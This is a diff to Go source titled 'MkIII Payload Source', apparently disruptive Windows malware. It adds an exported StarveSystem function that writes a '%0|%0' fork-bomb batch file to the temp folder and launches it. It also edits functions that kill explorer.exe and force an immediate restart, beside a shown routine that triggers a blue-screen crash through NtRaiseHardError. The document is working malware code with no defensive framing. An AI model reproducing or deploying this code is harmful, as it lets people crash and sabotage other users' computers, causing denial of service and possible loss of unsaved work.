@@ -8,6 +8,8 @@ MkIII Payload Source
 
 package main
 
+import "C"
+
 import (
 	"encoding/base64"
 	"fmt"
@@ -181,15 +183,31 @@ func DoBSoD() {
 	NtRaiseHardError.Call(0xDEADFEED, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
 }
 
+//export StarveSystem
+func StarveSystem() {
+	file := TEMP + "\\" + RandStringBytes(8) + ".bat"
+
+	f, _ := os.Create(file)
+	f.Close()
+
+	err := os.WriteFile(file, []byte("%0|%0"), 0644)
+
+	if err != nil {
+		fmt.Println("Something went wrong: ", err)
+	}
+
+	exec.Command("cmd.exe", "/C", file).Start()
+}
+
 func KillDesktop() {
-	err := exec.Command("cmd", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
+	err := exec.Command("cmd.exe", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
 	if err != nil {
 		fmt.Println("Failed to kill Desktop process:", err)
 	}
 }
 
 func ForceShutdown() {
-	if err := exec.Command("cmd", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
+	if err := exec.Command("cmd.exe", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
 		fmt.Println("Failed to initiate shutdown:", err)
 	}
 }
